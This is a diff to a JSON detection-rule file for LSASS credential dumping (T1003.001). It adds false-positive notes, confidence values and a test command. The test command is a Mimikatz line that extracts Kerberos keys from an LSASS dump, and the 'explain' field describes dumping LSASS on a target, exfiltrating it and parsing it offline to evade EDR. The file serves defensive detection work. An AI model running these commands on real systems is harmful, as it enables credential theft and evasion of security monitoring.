@@ -119,7 +119,8 @@
           "T1003.001"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "splunk",
@@ -133,7 +134,8 @@
         "confidence": "medium",
         "log_ids": [
           "10"
-        ]
+        ],
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "splunk",
@@ -147,7 +149,8 @@
         "confidence": "medium",
         "log_ids": [
           "11"
-        ]
+        ],
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "sigma",
@@ -158,7 +161,8 @@
           "T1003.001"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "sigma",
@@ -169,7 +173,8 @@
           "T1003.001"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "elastic",
@@ -179,7 +184,9 @@
         "attack": [
           "T1003.001"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Security assessment tools performing authorized credential testing",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -216,7 +223,8 @@
         "Check for credential dumping artifacts (LSASS access, SAM hive reads, Kerberos anomalies)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "mimikatz.exe \"sekurlsa::minidump <dump_file>\" \"sekurlsa::ekeys\" \"exit\""
     }
   },
   "explain": "Dumps LSASS on the target and parses it offline, so Mimikatz never runs on the victim (evades on-host EDR):\n  mimikatz.exe              runs on YOUR box, not the target\n  \"sekurlsa::minidump <dump_file>\"   load the exfiltrated LSASS dump instead of live memory\n  \"sekurlsa::ekeys\"         extract Kerberos AES/RC4 keys from it\n  \"exit\"                    quit\nCreate the dump on the target with a managed minidump tool, exfil it (repair with Reverse.exe if byte-reversed), then parse locally."
